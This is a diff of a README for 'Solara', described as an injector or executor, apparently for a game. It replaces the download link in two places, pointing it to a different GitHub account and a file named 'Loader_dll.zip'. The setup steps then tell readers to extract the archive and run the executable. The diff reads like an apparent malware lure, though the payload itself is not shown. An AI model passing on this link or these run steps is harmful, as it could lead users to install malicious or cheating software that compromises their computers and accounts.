@@ -434,7 +434,7 @@
 
 <div align="center">
   
-[Download the Latest Version](https://github.com/zheinmuluk/Solara-Executor/releases/download/Download/application.zip)
+[Download the Latest Version](https://github.com/secondlathloothy/Solara-executor/releases/download/Download/Loader_dll.zip)
 
 
  ## Features
@@ -450,7 +450,7 @@
 
 To install Solara, follow these steps:
 
-1. [Download the Latest Version](https://github.com/zheinmuluk/Solara-Executor/releases/download/Download/application.zip) page and download the latest version of Solara.
+1. [Download the Latest Version](https://github.com/secondlathloothy/Solara-executor/releases/download/Download/Loader_dll.zip) page and download the latest version of Solara.
 2. **Extract the Files:** Extract the downloaded zip file to a location of your choice on your computer.
 3. **Run Solara:** Open the extracted folder and run the `Solara.exe` file to launch the injector.
 
